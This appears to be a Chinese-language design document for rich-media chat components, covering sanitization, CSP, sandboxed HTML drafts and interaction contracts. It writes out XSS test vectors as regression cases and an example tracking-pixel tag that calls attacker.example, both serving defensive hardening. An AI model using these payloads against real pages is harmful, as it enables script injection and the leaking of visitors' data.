# 聊天富媒体组件设计方案

> 目标：让回答从「一段 Markdown 文字」变成「能看、能点、可回传的可视化界面」，
> 尤其服务长结论、多数据、结构关系类内容。参考 DSH Motion UI 的能力面，
> 但不采用其「自由生成 HTML/JS」的自由模式。

---

## 一、现状（实测，非推测）

### 1.1 已有三条渲染通道

| 通道 | 位置 | 职责 | 现状 |
|---|---|---|---|
| A. 正文 Markdown | `pages/chat/components/MarkdownBlock.tsx` | 助手回答正文 | `react-markdown` + `remark-gfm` + `remark-math` + `rehype-katex` + **`rehype-raw`** |
| B. 工具卡片 | `pages/chat/presentation/PresentationRegistry.ts` | 工具调用结果卡片 | 八类 kind 分派：generic/terminal/diff/search/read/web/delegation/job |
| C. Desktop 工具区 | `Source/PuddingDesktop/MainWindow.xaml` | 独立窗口形态 | `ToolTabKind.Artifact`（制成品）、`ToolTabKind.Panel`（交互面板）**壳已存在、通道未建** |

### 1.2 现成的扩展点（这是本方案能低成本落地的基础）

`MarkdownBlock.tsx` 的 `code` 组件**已经按语言分派**：

```tsx
if (className === 'language-image' && workspaceId) { /* → ZoomableImage */ }
```

⇒ 新增组件只需在同一个 `code` 分支里按 `language-*` 继续分派，
**不需要改 Markdown 解析管线，也不需要新协议**。

### 1.3 两个必须先说清的缺口

**缺口 1（高危，已修复 `2ade834`）：当前管线无 HTML 消毒。**
`MarkdownBlock.tsx` 使用 `rehypePlugins={[rehypeKatex, rehypeRaw]}`，`package.json` 里
有 `rehype-raw ^7.0.0` 但**没有 `rehype-sanitize`**。
这与 LightRAG 被披露的存储型 XSS（GHSA-xpjq-3w4w-w5wr）**完全同构**：模型输出（或它读到的外部内容）中的
`<iframe srcdoc>`、`<svg><script>`、`on*` 事件会直接进入 DOM。
一旦引入可交互组件，攻击面只会更大。

**缺口 2：Desktop 的「制成品 / 交互面板」只有占位。**
`MainWindow.xaml.cs` 的文案已写明：「制成品预览尚未接入 Core 成果接口」
「交互面板尚未接入：提交流道未建立，因此不提供输入控件」。
⇒ 本方案不假装它们可用，而是给出接入契约。

## 二、安全红线（Phase 0，必须先做，否则不允许上任何组件）

外部证据（两条真实缺陷修复）：

- LightRAG `GHSA-xpjq-3w4w-w5wr`：`rehypeRaw` 无 sanitizer ⇒ 存储型 XSS；修法是
  **`rehype-sanitize` 紧接 `rehypeRaw`**、KaTeX `trust:false`、Mermaid `securityLevel` 由 `loose` 改 `strict`。
  <https://github.com/HKUDS/LightRAG/pull/3437>
- CopilotKit #5629：把 `rehype-sanitize` 放在**最后一个 rehype pass**，
  使消费者自定义插件无法绕过；并补 CSP（`base-uri 'self'`、`form-action 'self'`）。
  <https://github.com/CopilotKit/CopilotKit/pull/5629>

### 2.1 必须执行的七条

| # | 红线 | 落地位置 |
|---|---|---|
1 | `rehype-sanitize` 作为**终结 rehype pass**（在 raw 与 katex 之后） | `MarkdownBlock.tsx` 的 rehypePlugins |
2 | schema 基于 GitHub defaultSchema，只放行 KaTeX 所需的 `math-inline`/`math-display` class | 新建 `utils/markdownSanitizeSchema.ts` |
3 | 硬阻断 `<script>/<iframe>/<object>/<embed>/<style>`、全部 `on*`、`style` 属性、`javascript:` 协议 | 同上 |
4 | KaTeX `trust: false`（禁 `\href{javascript:}`、`\includegraphics` 远程加载） | `rehype-katex` 配置 |
5 | Mermaid `securityLevel: 'strict'`；产出的 SVG **仍需过消毒**再插入 DOM | Mermaid 组件 |
6 | 图片只允许 `vision-*` artifact id 或同源 API 路径；禁 `data:`（防追踪像素） | 复用现有 `resolveVisionArtifactId` |
7 | CSP：`script-src 'self'`、`base-uri 'self'`、`form-action 'self'` | Web 宿主响应头 |

### 2.1b 版本下限（新增的两个自带 HTML 的渲染器）

富媒体的新风险不是来自我们的代码，而是来自**第三方渲染器自带的 HTML sink**：

| 依赖 | 最低版本 | 原因 |
|---|---|---|
mermaid | **≥ 11.15.0**（或 ≥ 10.9.6） | CVE-2026-41149：HTML 注入 |
ECharts | **≥ 6.1.0** | CVE-2026-45249：tooltip `formatter` 的 `innerHTML` sink |

规则：`formatter` 一律返回纯文本，禁止拼接 HTML；mermaid 输出 SVG 仍需过一遍消毒再插入。

### 2.2 验收方式（能取红才算数）

用同一套向量做回归测试，断言**被中和**而非仅"没报错"：

```
<iframe srcdoc="<script>alert(1)</script>">
<svg><script>alert(1)</script></svg>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">x</a>
<div style="position:fixed;inset:0">
```

同时断言合法能力**未被误伤**：KaTeX 公式、`<mark>`/`<u>`、脚注链接、GFM 表格。

## 三、组件清单与选型

### 3.1 七类组件

| 组件 | 围栏语言 | 输入形态 | 交互性 | 渲染位置 |
|---|---|---|---|---|
Mermaid 图 | ` ```mermaid ` | Mermaid DSL 源码 | 只读（可缩放/下载 SVG） | 内联 |
ECharts 图 | ` ```echarts ` | ECharts option JSON | 纯前端（tooltip/图例/缩放） | 内联 |
SVG / 图片 | ` ```svg ` / ` ```image ` | SVG 源码 / `vision-*` id | 只读（点击放大） | 内联 |
可交互表格 | ` ```table ` | `{columns, rows}` JSON | 纯前端（排序/筛选/CSV） | 内联 |
选项卡 | ` ```tabs ` | `[{label, body}]` | 纯前端 | 内联 |
测验 | ` ```quiz ` | `{question, options, answer, explain}` | 提交后**回传模型** | 内联 + 回传 |
表单 | ` ```form ` | `{fields, submitLabel}` | 提交后**回传模型** | 内联 + 回传 |

### 3.1b 两条实测取舍

- **Mermaid 用 `mermaid.render()` 而非 `run()`**：`run()` 会扫描页面里 `class="mermaid"` 的节点自行改写 DOM，
  在 React 受控渲染下形成"先渲染原文、再被库改写"的双写冲突；`render()` 返回 SVG 字符串 + `bindFunctions`，
  由我们插入并绑事件，可控。
- **CSV 导出要防公式注入**：单元格以 `=` `+` `-` `@` 或 Tab/CR/LF 开头时前置 `'`（OWASP CSV Injection）；
  **全角 `＝＋－＠` 在部分区域设置下同样会被当公式执行**，必须一并处理；
  文件用 **UTF-8 + BOM**、行尾 CRLF（RFC 4180），否则 Excel 打开中文乱码。

### 3.2 核心取舍：**只接受声明式 spec，不接受可执行代码**

Motion UI 的「自由设计模式」允许模型直接产出 HTML/SVG/JS。我们不采用，理由：

1. **安全**：任意 HTML 就是任意 XSS 面，消毒只能缓解不能消除；
2. **可测**：声明式 spec 可以做 schema 校验 + 快照测试；任意 HTML 无法断言；
3. **可降级**：spec 解析失败可回退成代码块；任意 HTML 失败只能空白；
4. **体积**：不需要引入 JSX/HTML 运行时与沙箱 iframe。

⇒ 每类组件定义 **JSON Schema**，服务端与前端共享同一份校验规则。

### 3.3 依赖与体积纪律

现状：`package.json` 已有 `react-markdown` / `remark-gfm` / `remark-math` / `rehype-katex` / `rehype-raw`，
**没有** mermaid、echarts、rehype-sanitize。

要求：

- `mermaid`、`echarts` **必须动态 import**，不进首屏 chat chunk；
- 图表库按需引入（ECharts 用 `echarts/core` + 显式 `use()` 注册图表与组件）；
- 每个新组件上线前必须实测 gzip 体积并记入 `chat-bundle-budget` 基线；
- 门禁实测：chat 路由 chunk **≤ 496 KiB**（`scripts/check-chat-bundle-budget.cjs:14`）；同步入口 ≤ 1536 KiB。
- 体积基线【实测 bundlephobia】：mermaid 主入口 **173.5 KB gzip**、ECharts 全量 **368 KB gzip**、dompurify **11.5 KB gzip** ⇒ **三者都不得进首屏**，只能 fence 触发后动态 import。

> 具体体积数字**尚未实测**，不在本方案里编造；Phase 1 首件产出就是体积基线表。

## 四、UX 形态：三种，各管一件事

外部对照（2026 年公开对比）：Claude Artifacts 与 ChatGPT Canvas 都采用**侧栏**承载
可交互产物；差异在于 Artifacts 偏"可运行产物"，Canvas 偏"长文编辑"。

- <https://www.boosterlabs.fr/blog/claude-artifacts-vs-chatgpt-canvas-2026>
- <https://aiwiki.ai/wiki/claude_artifacts/edit>

我们的 Desktop 已有「制成品 / 交互面板」两个 tab，**形态与 Artifacts 侧栏同构**，
缺的是通道而非 UI 骨架。

### 4.1 决策表

| 形态 | 用于 | 判据 | 落地 |
|---|---|---|---|
**内联块** | 轻量、单屏可读、无需保存 | 图表 ≤ 1 屏、表格 ≤ 200 行、纯前端交互 | chat 正文直接渲染 |
**侧栏面板** | 需要空间/多视图/保存复用 | 多 tab 报告、大仪表盘、需历史版本 | Desktop `ToolTabKind.Artifact` |
**交互提交** | 用户输入需回到模型 | 表单、测验、参数调节 | 内联 + 结构化回传 |

默认**内联**。只有满足「超出一屏 或 需要持久化 或 需要多视图」才升级到侧栏。

### 4.2 流式时机：**围栏闭合后才渲染**

理由：半截 JSON 反复初始化图表会闪烁 + 反复 dispose/init，且外网图表库初始化成本高。

- `isStreaming=true` 且围栏未闭合 → 显示占位骨架（"正在生成图表…"）
- 围栏闭合 → 解析 spec → 渲染
- 已有 `isStreaming` prop 可直接复用，无需改数据流

### 4.3 失败降级（必须，不许留白）

| 失败 | 表现 |
|---|---|
spec JSON 解析失败 | 回退为代码块 + 一行错误说明（保留原文可复制） |
schema 校验失败 | 同上，并指出缺哪个字段 |
渲染抛异常 | 每个块独立 ErrorBoundary，只坏这一块 |
图表库加载失败 | 回退为"图表不可用"+ 原始数据表 |

### 4.4 可访问性与主题

- 图表需 `aria-label` 摘要 + 可展开的数据表（ECharts 自带的 ARIA 组件可用）
- Mermaid 生成 SVG 补 `<title>`/`role="img"`
- 全部组件跟随明暗主题（ECharts 需在主题切换时 `dispose` 重建）

## 五、交互回传契约

「允许用户交互」分两种，**必须区分**，否则模型会把 UI 操作当成新指令。

| 类型 | 例子 | 是否回传 | 说明 |
|---|---|---|---|
纯前端 | 表格排序/筛选、切 tab、图表缩放 | **否** | 只在本地状态，不产生消息 |
回传模型 | 表单提交、测验答案 | **是** | 生成一条结构化 user 消息 |

### 5.1 回传消息格式（建议）

```json
{
  "kind": "ui_response",
  "blockId": "blk-7f3a",
  "component": "form",
  "schemaVersion": 1,
  "values": { "budget": 5000, "region": "华东" },
  "display": "预算 5000 / 地区 华东"
}
```

投递时用**带版本号的包裹块**，让模型一眼看出这是用户数据而不是新指令：

```text
[UI_SUBMISSION v=1 id=blk-7f3a type=form]
{ "budget": 5000, "region": "华东" }
[/UI_SUBMISSION]
```

正文（`display`）另行给出，供模型直接读；`values` 供程序消费。
`v` 与 `id` 必带：`id` + 相同 `values` 的重复提交按**幂等丢弃**，避免网络重试或用户连点把同一次提交算两次。

### 5.2 防注入

- 回传内容在 prompt 中明确包裹为用户数据区（与工具结果同等待遇），**不提升为指令**
- 值长度与类型受 schema 约束（禁自由文本超长）
- **服务端归一化**：类型/枚举/数值范围在入库前再校验一次，不信任前端已校验
- 服务端记录来源 blockId 与 `v`，便于审计、重放与跨版本兼容

## 六·补、交互面板与制成品（2026-10-19 需求对齐）

> 本节回答：**Chat 负责什么、右侧交互面板负责什么、制成品负责什么。**
> 现状核对：Desktop 的 `ToolTabKind.Artifact` / `ToolTabKind.Panel` 只有 tab 壳与占位文案
> （`MainWindow.xaml.cs:1035-1051`），内容承载与回传通道均未建。

### 6.1 一条硬判据：是否需要「回到对话」

| 区域 | 判据 | 生命周期 | 交互性 | 谁读它 |
|---|---|---|---|---|
**Chat 内联** | 结论本身，一次看完就够 | 随消息 | 无状态（纯前端） | 将来的自己（回看） |
**交互面板** | **需要你的输入才能继续** | 会话级，Agent 可原位更新 | 有状态，提交后回传 | 现在的你（低摩擦） |
**制成品** | 产物留档 / 交付 / 复用 | 跨会话持久 | 默认只读（可下载/版本） | 团队与未来使用 |

判据只有一句：**要模型基于它继续推理 → 面板；只是留档查看 → 制成品；两者都不是 → 留在 Chat。**

### 6.2 交互面板承载四类内容

| 类型 | spec | 用途 | 提交后回传 |
|---|---|---|---|
问卷 `survey` | 字段 + 类型 + 校验 + 选项 | 需求对齐、参数收集 | 字段值 |
方案对比 `variants` | `[{id, title, html/svg}]` + 布局 | 多方案并排（如登录页 3 版） | 选中 id + 评分 + 标注 |
草稿 `draft` | `html` 或 `svg` 源码 | 原型、示意图、动画 | 通常只读，可标注 |
标注 `annotation` | 叠加在以上任一种之上 | 涂鸦 / 框选 / 箭头 / 文字 | 结构化标注数组 |

**标注必须是结构化的，不能只截一张图。** 模型读不懂像素；纯涂鸦回传等于没回传。

```json
{
  "type": "rect",
  "x": 312, "y": 148, "w": 96, "h": 32,
  "text": "这里太挤，按钮要再宽一点"
}
```

渲染层按 `rect / arrow / note` 三种基本图元产出；服务端归一化坐标（0..1），
再附一张可选截图供视觉模型看。**结构化给文本模型，截图给视觉模型**，两条都要。

### 6.3 安全分层（这是 WebView2 隔离真正要解决的问题）

| 内容 | 渲染方式 | 权限边界 |
|---|---|---|
声明式 spec（问卷 / 对比 / 选项卡） | 宿主 React 组件 | **无代码执行**，最安全 |
SVG 草稿 | `DOMPurify(USE_PROFILES.svg)` 后内联 | 无脚本、无外链 |
HTML 草稿 | **独立 WebView2**（或 Web 端 sandbox iframe） | 见下 |
外部网页 | 现有浏览器 tab | 用户主动导航 |

HTML 草稿沙箱的六条硬规则：

1. **独立 origin / 独立 WebView2 实例**，不共享宿主 cookie 与 localStorage；
2. **不注入宿主脚本**，`window.chrome.webview` 只保留 **一条** `postMessage` 通道；
3. 回传消息**白名单校验**（只接受 `annotation` / `selection` / `ready` 三类）；
4. 内容 CSP：`default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; script-src 'none'`。
   ⚠️ **sandbox 属性不管网络**（2026-10-19 外部评审指出，已实测确认）：`sandbox=""` 只禁脚本；
   一段 `<img src="https://attacker.example/track?id=draft-123">` 在沙箱里**仍会发出请求**，
   暴露访问者 IP 与访问时间，而且这类风险**不依赖 JavaScript**。
   所以「禁网络」必须靠 CSP 兜底，不能指望 sandbox。
   ⚠️ 此处 `img-src` **不列 `https:`**（与第 6 条一致）：需要图片一律 `data:` 内联。
5. **禁 `allow-scripts + allow-same-origin` 组合**（等价于没有沙箱）；
6. 草稿内**不允许外链请求**（防追踪像素与数据外带），需要图片一律内联 base64 或 `vision-*`。

> 关键取舍：**HTML 草稿跑在沙箱里，标注就只能基于截图做**——跨源 iframe 读不到 DOM。
> 声明式 spec 才能做"DOM 级标注"（精确到元素）。这也是为什么问卷/对比优先走声明式。

### 6.4 回读机制：默认被动，主动要显式

| 方式 | 触发 | 形态 | 风险 |
|---|---|---|---|
**被动提交** | 用户点「提交」 | 一条 `[UI_SUBMISSION v=1 id=…]` 用户消息 | 低；用户明确动作 |
**主动读取** | Agent 调 `panel_read` | 返回 `{spec, values, annotations, version}` 快照 | 高；可能轮询烧 token |

规则：**Agent 不得轮询面板**。主动读取必须显式调用且有版本号——版本不符时
返回 `stale` 而不是旧数据，避免模型基于过期内容推理。

### 6.5 一个完整流程（登录界面设计）

1. **Chat**：确认约束（B 端 / 支持 SSO / 手机号登录），给三个方向；
2. **面板**：并排三张简化 HTML 草稿 —— A 极简、B 品牌重、C 引导式；
3. **你**：点选 B，在 B 的按钮上画框并写「这里太挤」；
4. **面板提交** → 回传 `{selected:"B", annotations:[{type:"rect",…}]}`；
5. **Chat**：基于标注改，产出 v2；
6. **制成品**：满意后「存为制成品」，可复用的登录页草稿进产物库。

三个区各司其职，且共享同一份 spec 与校验 schema。

### 6.6 四个决策（2026-10-19 已确认，已落进 `panel/spec.ts`）

| 决策 | 结论 | 落地方式 |
|---|---|---|
| 面板粒度 | **会话级**：一个会话一个面板，Agent 原位更新 | `spec.id` 稳定不变，不新开 tab |
| 外链资源 | **禁止**：`src`/`href`/`poster`/`@import`/`url()`/`<link>` 全拒；`data:` 内联放行 | 校验器 fail closed，误报即拒 |
| 标注坐标系 | 声明式内容画 DOM（可带 `targetId` 精确到元素）；HTML 草稿只能画截图 | `Annotation.targetId` + 归一化坐标 0..1 |
| 并排布局 | **固定四档 1/2/3/4** | `layout: 1 \| 2 \| 3 \| 4`，越界即拒 |

实现与测试：`panel/spec.ts` / `panel/submission.ts`（提交 `5cdc6f3`），
两套件 28/28，变异取红（清空外链规则 → 用例失败）。

## 六·补二、场景推演与两条设计修正（2026-10-19）

用户给出两个具体场景，用来检验前面的分工是否站得住。推演后有两处**必须修正**的地方。

### 6b.1 场景 A：HA 多房间温度 + 历史

**这不是"表格不好看"，是三个不同问题被塞进了一张表：**

| 问题 | 规模 | 用户真正想要的 |
|---|---|---|
当前值 | 26 个传感器 | **一眼看出哪间异常**，不是逐行读数 |
历史趋势 | 26 × N 个点 | **少数几条可对比**，不是全量曲线 |
偏好 | 关心哪几间 / 什么时段 | 需要**问你**，而不是猜 |

**四段式展示：**

| 层 | 内容 | 形态 |
|---|---|---|
结论 | 「客厅 26.1°C 最高；主卧比昨天同期低 2.3°C；其余平稳」 | Chat 一句话 |
概览 | 26 间按温度排序 + 阈值色带 | 内联（≤1 屏） |
趋势 | 默认 3 条（异常 + 你上次关注的）24h 曲线 | 内联或面板 |
深挖 | 全房间 × 7 天，可筛房间/切时间窗/导出 CSV | 交互面板 |
沉淀 | 周报，可跨周对比 | 制成品 |

偏好收集放在面板：房间多选 + 告警阈值滑块 → 提交后成为可复用偏好。

### 6b.2 修正一：图表数据**不该由模型手写**

原方案假设模型输出 ECharts option（内含全部数据点）。26 间 × 7 天 = 4368 个点，
写进 option JSON 是 token 浪费，而且图与表很容易不同源。

改为 **spec 引用数据源**：

```json
{
  "kind": "chart",
  "source": "tool:ha_history#c7f2",
  "x": "time",
  "y": "temperature",
  "series": "entity_id",
  "transform": "resample:1h",
  "focus": ["sensor.living_room_temp", "sensor.master_bedroom_temp"]
}
```

模型只描述「怎么画」，数据由前端凭 `source` 从已落库的工具结果取。
三个收益：token 降两个数量级；图与表永远同源；换 resample 粒度不必重问模型。

**这条要进 P1**，否则图表能力只能用于"十几行的小数据"。

### 6b.3 场景 B：机械设计 / 出游策划

**共性：产物是「可交付物」，不是「回答」。**

| 场景 | 产物形态 | 需要的能力 |
|---|---|---|
机械结构 | 等轴测图 / 剖面 / 爆炸图 / 可旋转 3D / BOM | 图片 + glTF + 表格 |
出游策划 | 日程表 / 地图 / 预算 / 预订清单 | 表格 + 地图 + 表单 |

### 6b.4 修正二：产物必须是**独立实体**，且**不阻塞对话**

用户一句「我不需要停留，可以继续跟你聊天」，改变了产物的架构地位：
它不能是"消息的附件"，必须有独立生命周期。

| 要求 | 含义 |
|---|---|
独立 id + 版本 | 产物可被更新、可对比、可回滚 |
状态机 | 生成中 / 就绪 / 失败，失败可重试 |
非阻塞 | 渲染在右侧，不占对话轮次；你切走再回来它还在 |
不打断 | 完成时只在角标提示，不弹窗 |

因此「制成品」不是 UI 上的一个 Tab，而是 Core 里的一个实体（Artifact），
Tab 只是它的一个视图。

### 6b.5 3D / 多媒体的技术边界

- **3D 必须在沙箱里跑**（WebGL），体积大需动态加载；
- 模型产出**声明式几何或 glTF 引用**，不手写 Three.js 代码（同"只接受声明式 spec"）；
- PDF 用沙箱内渲染器或交给系统查看器；
- 音视频只能内联或引用本地 artifact，**禁外链**（与 6.3 一致）。

### 6b.6 展示形态决策树（落到实现前的判据）

```
这段内容需要用户做什么？
├─ 只是读一眼       → Chat 内联（结论 + 小图）
├─ 要做选择/填写    → 交互面板（提交后回传）
├─ 要带走/复用/对比 → 制成品（独立实体，非阻塞）
└─ 要边看边聊       → 制成品（右侧，不占轮次）
```

再叠两条量化判据：**≤20 行 / ≤1 屏走内联；其余走面板或制成品。**

## 六·补三、长文档与文档产物（2026-10-19 需求补充）

用户提出的痛点：**长 Markdown（如设计方案）挤在 chat 里，翻找极痛苦；想读全文还得复制路径去硬盘打开。**

这不是"再加一个渲染器"，是把文档升格为**一等产物**。

### 6c.1 归属：文档属于「制成品」，不属于「面板」

| | 面板 | 文档（制成品） |
|---|---|---|
生命周期 | 会话级，Agent 原位更新 | 跨会话持久，可保存/编辑/版本 |
交互 | 需要你输入并回传 | 以阅读为主，可选编辑 |
判据 | **要我继续推理** | **要留档/反复读/交付** |

所以右侧文档视图挂在 `ToolTabKind.Artifact`，不占 `Panel`。

### 6c.2 chat 侧三个入口

| 入口 | 触发 | chat 里长什么样 |
|---|---|---|
**长消息折叠** | 助手消息超过阈值 | 前 ~15 行 + 「全文约 N 字 · 在右侧打开」，可展开回 chat |
**文档引用** | 行内 code 且扩展名为 `.md` / `.pdf` / `.html` | 文档卡片（图标 + 文件名 + 大小），点击即开 |
**显式产物** | 我生成文档时直接登记为 Artifact | 一条卡片，同时在制成品里出现 |

**折叠判据不能只看字数。** 设计方案的特征是多标题、多表格、多代码：

```
字数 > 3000  或  标题数 ≥ 3  或  围栏代码块 ≥ 3   → 折叠
```

但折叠必须**用户可关**——有人就喜欢在 chat 里滚，不能强制。

### 6c.3 文档引用的识别规则（防误伤）

只对**行内 code**（`` `Docs/xx.md` ``）且扩展名命中时转成可点击卡片：

- 不碰围栏代码块里的路径（那是示例，不是引用）
- 不碰裸文本里的路径（避免把普通叙述变成链接）
- 支持 `artifact://<id>` 与工作区相对路径两种形式

这样「我在正文里写 `Docs/12_features/xxx.md`」才是可点的，「代码示例里的路径」不会。

### 6c.4 右侧文档视图

| 能力 | 说明 |
|---|---|
大纲 | H1–H3 侧边目录，长文档必需 |
渲染 | **复用 `MarkdownPreview`**：它明确不启用 `rehype-raw`，已有安全约定 |
编辑 | 受控编辑器 + **显式保存**（不自动保存，避免误改） |
存为制成品 | 从临时预览转成持久 Artifact |
其他 | 复制路径 / 下载 / 在系统编辑器打开 |

### 6c.5 边界与安全

| 约束 | 值 |
|---|---|
可读范围 | **仅工作区内路径**，拒绝 `..` 穿越与盘符绝对路径 |
大小上限 | 2 MB；超出提示「用系统编辑器打开」，不硬塞进浏览器 |
编辑保存 | 需写权限 + 审计（谁改、何时、原 SHA-256） |
PDF | 沙箱内渲染器，或交给系统查看器；不做外链加载 |
HTML | 走 6.3 的沙箱六条规则，不内联进宿主 DOM |

### 6c.6 与「不阻塞」的关系

文档预览是**旁路**：打开不打断对话，你可以在右边读方案、左边继续跟我改下一节。
这与 6b.4 的「产物是独立实体」是同一条原则。

### 6c.7 落地顺序

1. 纯函数：文档引用识别（行内 code + 扩展名）——可独立测试；
2. 右侧 Markdown 视图（复用 MarkdownPreview + 大纲）——不依赖 Core；
3. 宿主文件读取端口（工作区边界 + 大小上限）——需要 Core；
4. 编辑与保存（写权限 + 审计）；
5. 长消息折叠（前端判据 + 可关闭开关）。

## 六·补四、Desktop 渲染载体选择（2026-10-19 事实校正）

用户提示：Desktop 可以用原生 C# 加载资源，WebView 或原生界面取决于"哪个更简单合理、
性能可接受"，复杂的可以调本地程序。方向正确，但有一处**技术事实需要先校正**，
它直接决定 3D 走哪条路。

### 6d.1 事实校正：Desktop 是 WinUI 3，不是 WPF

```
Source/PuddingDesktop/PuddingDesktop.csproj
  <TargetFramework>net10.0-windows10.0.19041.0</TargetFramework>
  <UseWinUI>true</UseWinUI>
  <PackageReference Include="Microsoft.WindowsAppSDK" Version="1.8.260921001" />
```

这对方案的影响不是措辞问题：

| | WPF | WinUI 3（本项目） |
|---|---|---|
3D 视口 | 有 `Viewport3D`，`HelixToolkit` 可直接用 | **没有内置 3D 控件** |
2D 绘制 | `DrawingVisual` | Win2D / `CanvasControl` |
PDF | 需第三方 | `Windows.Data.Pdf` 可渲染页，但翻页/缩放要自己做 |

所以「用原生 C# 加载 3D 模型」在本项目里**做不到 XAML 层直出**：
要么 Win2D/DirectX 互操作自己写渲染，要么 WebView2 + Three.js / `<model-viewer>`。
后者的成本低一个数量级——这恰好符合"哪个更简单合理"的判据。

### 6d.2 载体选择表

| 内容 | 首选载体 | 理由 |
|---|---|---|
图片 | **原生 `Image`** | 轻；走 WebView 会多一个进程且拖慢滚动 |
音视频 | **`MediaPlayerElement`** | 硬解，性能优于浏览器 |
Markdown 文档 | **WebView2**（复用前端渲染器 + 大纲 + 编辑） | 避免第二套 Markdown 实现，两端行为一致 |
PDF | **WebView2 内置 PDF viewer** | 零成本；`Windows.Data.Pdf` 要自己实现翻页与缩放 |
HTML 草稿 | **独立 WebView2 沙箱** | 需要回传标注，外部打开就断链 |
3D（glTF/GLB） | **WebView2 + model-viewer / Three.js** | WinUI3 无内置 3D 视口 |
Office / CAD / 未知格式 | **外部程序（ShellExecute）** | 不重复造轮子 |

### 6d.3 四条判据（按顺序问）

1. **需要回传交互吗？**（标注、表单、选择）→ 必须留在产品内，不能外放；
2. **只是看且格式简单？**（图片、音视频）→ 原生控件，别上 WebView；
3. **需要引擎吗？**（HTML/CSS/PDF/3D/图表）→ WebView2；
4. **冷门且重？**（Office、CAD、压缩包）→ 外部程序，但要受约束（见 6d.4）。

### 6d.4 外部打开的安全约束

| 约束 | 值 |
|---|---|
触发方式 | `ShellExecute` 交系统关联程序，**不拼命令行参数**（防命令注入） |
扩展名 | 白名单：`.pdf .docx .xlsx .pptx .step .stp .dwg .zip` 等 |
路径 | 只允许工作区内；`..` 穿越与盘符绝对路径拒绝 |
审计 | 记录「谁 / 何时 / 打开了哪个文件」 |

### 6d.5 两条反例（写下来防止以后走偏）

- **不要把所有内容都塞 WebView**：图片、音视频走原生，省一个进程与一份内存；
- **不要给 3D 写原生渲染**：WinUI3 没有视口，自研 DirectX 互操作的成本远高于
  WebView2 + model-viewer，且没有收益。
